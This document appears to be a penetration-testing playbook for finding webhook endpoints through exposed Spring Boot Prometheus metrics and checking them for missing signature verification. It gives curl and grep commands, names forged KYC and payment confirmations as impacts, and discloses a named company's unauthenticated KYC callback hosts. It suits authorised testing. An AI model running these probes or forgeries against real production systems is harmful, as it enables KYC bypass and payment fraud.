# Prometheus Metrics → Webhook Endpoint Discovery

## Trigger
- Spring Boot actuator/prometheus endpoint exposed (Phase 2-3)
- Target uses webhook callbacks from third-party services

## Technique

### 1. Find Prometheus Metrics
```bash
# Check both prod and test instances
curl -sk "https://TARGET/actuator/prometheus" > prometheus-dump.txt
```

### 2. Extract URI Labels (Endpoint Discovery)
```bash
grep 'uri="' prometheus-dump.txt | grep -oE 'uri="[^"]+' | sort -u
```
This reveals ALL HTTP routes the application handles, including:
- Internal callback endpoints not in any docs
- Webhook receivers for third-party services
- Admin/debug endpoints

### 3. Extract Service Architecture
```bash
# Kafka topics (reveal internal message flow)
grep 'topic="' prometheus-dump.txt | grep -oE 'topic="[^"]+' | sort -u

# Class names (reveal service structure)
grep 'class="' prometheus-dump.txt | grep -oE 'class="[^"]+' | sort -u

# Vendor integrations
grep 'vendor="' prometheus-dump.txt | grep -oE 'vendor="[^"]+' | sort -u
```

### 4. Test Webhook Endpoints for Signature Bypass
Once URIs are extracted, test each webhook endpoint on PROD:

```bash
# Step 1: Verify endpoint exists (non-404)
curl -sk -X POST -o /dev/null -w "%{http_code}" "https://PROD/callback/vendor/event" \
  -H "Content-Type: application/json" -d '{}'

# Step 2: Verify it's not a catch-all (test nonexistent path)
curl -sk -X POST -o /dev/null -w "%{http_code}" "https://PROD/callback/vendor/nonexistent" \
  -H "Content-Type: application/json" -d '{}'

# Step 3: Verify content-type validation (proves parsing)
curl -sk -X POST -o /dev/null -w "%{http_code}" "https://PROD/callback/vendor/event" \
  -H "Content-Type: text/plain" -d 'garbage'

# Step 4: Verify empty body rejection
curl -sk -X POST -o /dev/null -w "%{http_code}" "https://PROD/callback/vendor/event" \
  -H "Content-Type: application/json"

# Step 5: Test with invalid signature header
curl -sk -X POST -o /dev/null -w "%{http_code}" "https://PROD/callback/vendor/event" \
  -H "Content-Type: application/json" \
  -H "X-Payload-Digest: invaliddigest123" \
  -d '{"type":"event","id":"test"}'
```

### 5. Interpretation
| Behavior | Meaning |
|----------|---------|
| 415 on wrong content-type | App validates input format (real endpoint) |
| 400 on empty body | App requires payload (real endpoint) |
| 500 on nonexistent path | Routes are specific (not catch-all 200) |
| 200 with invalid signature | **NO SIGNATURE VERIFICATION** |
| 401/403 with invalid signature | Signature IS verified (not vulnerable) |

## Impact Assessment

### High-value webhook targets (financial platforms)
- **Sumsub/KYC callbacks**: Forge applicant approval → KYC bypass → unverified trading
- **Payment provider callbacks**: Forge payment confirmation → credit without payment
- **Identity verification**: Forge document validation → identity fraud enablement

### Medium-value webhook targets
- **AppsFlyer/attribution**: Forge install events → marketing fraud
- **Analytics callbacks**: Inject fake metrics → mislead business decisions

## Key Lesson (Capital.com, June 2026)
Prometheus metrics on `test-callback.backend-capital.com` revealed 15 callback URI paths including Sumsub KYC webhooks. Testing on the PROD instance (`callback.backend-capital.com`) confirmed:
- All endpoints accept POST without authentication
- X-Payload-Digest header not validated
- Content-type and body presence ARE validated (proving the app processes input)
- This is a High severity finding on a financial platform (KYC bypass potential)

## Pitfalls
- 200 with empty response body doesn't always mean "processed" — verify with multiple signals
- Test BOTH prod and test instances (test may have more endpoints exposed)
- Check if the 200 is from a reverse proxy vs the application itself
- Some webhook providers (Stripe, GitHub) use HMAC-SHA256 in custom headers — check the vendor's docs for the expected signature header name
